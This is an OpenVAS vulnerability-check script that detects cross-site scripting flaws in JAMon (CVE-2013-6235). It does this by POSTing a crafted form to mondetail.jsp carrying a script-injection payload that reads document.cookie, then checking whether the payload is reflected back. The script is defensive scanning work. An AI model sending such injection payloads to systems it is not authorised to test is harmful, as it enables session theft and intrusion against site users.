###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_jamon_mult_xss_vuln.nasl 11402 2018-09-15 09:13:36Z cfischer $
#
# JAMon Multiple Cross-Site Scripting Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803799");
  script_version("$Revision: 11402 $");
  script_cve_id("CVE-2013-6235");
  script_bugtraq_id(65122);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 11:13:36 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2014-02-10 15:38:15 +0530 (Mon, 10 Feb 2014)");
  script_name("JAMon Multiple Cross-Site Scripting Vulnerabilities");

  script_tag(name:"summary", value:"This host is installed with JAMon and is prone to multiple cross site scripting
  vulnerabilities.");
  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP POST request and check whether it is able to read
  cookie or not.");
  script_tag(name:"insight", value:"Input passed via the 'ArraySQL', 'listenertype', and 'currentlistener' POST
  parameters to mondetail.jsp and the 'ArraySQL' POST parameter to jamonadmin.jsp,
  sql.jsp, and exceptions.jsp is not properly sanitised before being returned to
  the user.");
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site.");
  script_tag(name:"affected", value:"JAMon (Java Application Monitor) version 2.7 and prior");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name:"URL", value:"http://secunia.com/advisories/56570");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/124933");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2014/Jan/164");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

jamonPort = get_http_port(default:80);

host = http_host_name(port:jamonPort);

foreach dir (make_list_unique("/", "/jamon", "/monitor", cgi_dirs(port:jamonPort)))
{

  if(dir == "/") dir = "";

  jamonReq = http_get(item:string(dir, "/menu.jsp"), port:jamonPort);
  jamonRes = http_keepalive_send_recv(port:jamonPort, data:jamonReq);

  ##  Confirm the application
  if(jamonRes && ('>JAMon' >< jamonRes && ">Manage Monitor page <" >< jamonRes ))
  {
    postdata = "listenertype=value&currentlistener=JAMonBufferListener&" +
               "outputTypeValue=html&formatterValue=%23%2C%23%23%23&buf" +
               "ferSize=No+Action&TextSize=&highlight=&ArraySQL=1--%3E1" +
               "%3CScRiPt%3Ealert%28document.cookie%29%3C%2FScRiPt%3E%3" +
               "C%21--&actionSbmt=Go+%21";

    jamonReq = string("POST ", dir, "/mondetail.jsp HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postdata), "\r\n",
                 "\r\n", postdata);

    jamonRes = http_keepalive_send_recv(port:jamonPort, data:jamonReq);

    if(jamonRes =~ "HTTP/1\.. 200" && "-->1<ScRiPt>alert(document.cookie)</ScRiPt><!--" >< jamonRes &&
       ">JAMon - Monitor Detail" >< jamonRes)
    {
      security_message(port:jamonPort);
      exit(0);
    }
  }
}

exit(99);
